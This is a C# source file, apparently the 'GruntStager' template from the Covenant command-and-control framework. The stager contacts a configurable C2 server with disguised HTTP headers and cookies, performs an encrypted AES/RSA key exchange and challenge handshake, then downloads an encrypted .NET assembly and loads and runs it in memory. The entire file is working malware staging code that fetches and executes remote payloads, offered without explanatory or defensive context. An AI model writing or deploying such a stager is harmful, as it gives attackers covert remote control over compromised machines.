using System;
using System.Net;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.IO.Pipes;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace GruntStager
{
    public class BruteStager
    {
        public BruteStager()
        {
            ExecuteStager();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            _ = new BruteStager();
        }
        public static void Execute()
        {
            _ = new BruteStager();
        }
        public void ExecuteStager()
        {
            try
            {
                List<string> CovenantURIs = @"{{REPLACE_COVENANT_URIS}}".Split(',').ToList();
                string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
                List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");

                Random random = new Random();
                string aGUID = @"{{REPLACE_GRUNT_GUID}}";
                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}");
                string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";

                Aes SetupAESKey = Aes.Create();
                SetupAESKey.Mode = CipherMode.CBC;
                SetupAESKey.Padding = PaddingMode.PKCS7;
                SetupAESKey.Key = SetupKeyBytes;
                SetupAESKey.GenerateIV();
                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);
                using (RSA rsa = RSA.Create())
                {
                    rsa.KeySize = 2048;
                    byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                    byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
                    byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
                    string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));

                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
                    ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                    {
                        bool valid = true;
                        if (UseCertPinning && CovenantCertHash != "")
                        {
                            valid = cert.GetCertHashString() == CovenantCertHash;
                        }
                        if (valid && ValidateCert)
                        {
                            valid = errors == System.Net.Security.SslPolicyErrors.None;
                        }
                        return valid;
                    };
                    string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));
                    CookieWebClient wc = null;
                    string Stage0Response = "";
                    wc = new CookieWebClient();
                    wc.UseDefaultCredentials = true;
                    wc.Proxy = WebRequest.DefaultWebProxy;
                    wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                    string CovenantURI = "";
                    foreach (string uri in CovenantURIs)
                    {
                        try
                        {
                            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                            {
                                if (ProfileHttpHeaderNames[i] == "Cookie")
                                {
                                    wc.SetCookies(new Uri(uri), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", ""));
                                }
                                else
                                {
                                    wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", ""), ProfileHttpHeaderValues[i].Replace("{GUID}", ""));
                                }
                            }
                            wc.DownloadString(uri + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", ""));
                            CovenantURI = uri;
                        }
                        catch
                        {
                            continue;
                        }
                    }
                    for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                    {
                        if (ProfileHttpHeaderNames[i] == "Cookie")
                        {
                            wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
                        }
                        else
                        {
                            wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
                        }
                    }
                    Stage0Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
                    string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
                    extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                    List<string> parsed = Parse(extracted, MessageFormat);
                    string iv64str = parsed[3];
                    string message64str = parsed[4];
                    string hash64str = parsed[5];
                    byte[] messageBytes = Convert.FromBase64String(message64str);
                    if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                    SetupAESKey.IV = Convert.FromBase64String(iv64str);
                    byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                    byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, RSAEncryptionPadding.OaepSHA1);

                    Aes SessionKey = Aes.Create();
                    SessionKey.Mode = CipherMode.CBC;
                    SessionKey.Padding = PaddingMode.PKCS7;
                    SessionKey.Key = FullyDecrypted;
                    SessionKey.GenerateIV();
                    hmac = new HMACSHA256(SessionKey.Key);
                    byte[] challenge1 = new byte[4];
                    RandomNumberGenerator rng = RandomNumberGenerator.Create();
                    rng.GetBytes(challenge1);
                    byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
                    hash = hmac.ComputeHash(EncryptedChallenge1);

                    string Stage1Body = String.Format(MessageFormat, GUID, "1", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));
                    transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));

                    string Stage1Response = "";
                    for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                    {
                        if (ProfileHttpHeaderNames[i] == "Cookie")
                        {
                            wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
                        }
                        else
                        {
                            wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
                        }
                    }
                    Stage1Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
                    extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];
                    extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                    parsed = Parse(extracted, MessageFormat);
                    iv64str = parsed[3];
                    message64str = parsed[4];
                    hash64str = parsed[5];
                    messageBytes = Convert.FromBase64String(message64str);
                    if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                    SessionKey.IV = Convert.FromBase64String(iv64str);

                    byte[] DecryptedChallenges = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                    byte[] challenge1Test = new byte[4];
                    byte[] challenge2 = new byte[4];
                    Buffer.BlockCopy(DecryptedChallenges, 0, challenge1Test, 0, 4);
                    Buffer.BlockCopy(DecryptedChallenges, 4, challenge2, 0, 4);
                    if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }

                    SessionKey.GenerateIV();
                    byte[] EncryptedChallenge2 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);
                    hash = hmac.ComputeHash(EncryptedChallenge2);

                    string Stage2Body = String.Format(MessageFormat, GUID, "2", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));
                    transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));

                    string Stage2Response = "";
                    for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                    {
                        if (ProfileHttpHeaderNames[i] == "Cookie")
                        {
                            wc.SetCookies(new Uri(CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ",").Replace("{GUID}", GUID));
                        }
                        else
                        {
                            wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID));
                        }
                    }
                    Stage2Response = wc.UploadString(CovenantURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse));
                    extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];
                    extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                    parsed = Parse(extracted, MessageFormat);
                    iv64str = parsed[3];
                    message64str = parsed[4];
                    hash64str = parsed[5];
                    messageBytes = Convert.FromBase64String(message64str);
                    if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                    SessionKey.IV = Convert.FromBase64String(iv64str);
                    byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                    Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
                    gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { CovenantURI, CovenantCertHash, GUID, SessionKey });
                }
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
        }

        public class CookieWebClient : WebClient
        {
            public CookieContainer CookieContainer { get; private set; }
            public CookieWebClient()
            {
                this.CookieContainer = new CookieContainer();
            }
            public void SetCookies(Uri uri, string cookies)
            {
                this.CookieContainer.SetCookies(uri, cookies);
            }
            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = base.GetWebRequest(address) as HttpWebRequest;
                if (request == null) return base.GetWebRequest(address);
                request.CookieContainer = CookieContainer;
                return request;
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
    }
}